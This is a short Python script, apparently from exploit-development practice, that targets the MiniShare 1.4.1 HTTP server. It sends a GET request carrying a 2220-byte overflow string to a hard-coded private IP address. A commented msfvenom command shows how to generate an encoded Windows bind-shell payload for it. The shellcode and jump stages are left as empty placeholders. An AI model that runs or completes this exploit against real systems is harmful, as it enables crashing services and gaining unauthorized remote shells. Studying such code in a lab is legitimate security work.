#!/usr/bin/python

import socket
import sys
import struct

banner = """
#----------------------------------------------#
MiniShare v1.4.1 HTTP Exploit Fuzzer
1. python minishare_1.4.1_http_fuzz.py
#----------------------------------------------#
"""

print banner

#msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LHOST=172.16.73.129 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f c
#shellcode = ()

offset = "A" * 2220
#nowjump
#bufferandshellcode
sploit = offset

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "\nDestroy them with lazers..."
s.connect(('172.16.73.129',80))
s.send('GET ' + sploit + ' HTTP/1.1\r\n\r\n')
s.close
print "\nFire in the hole! Go pick up the pieces!"
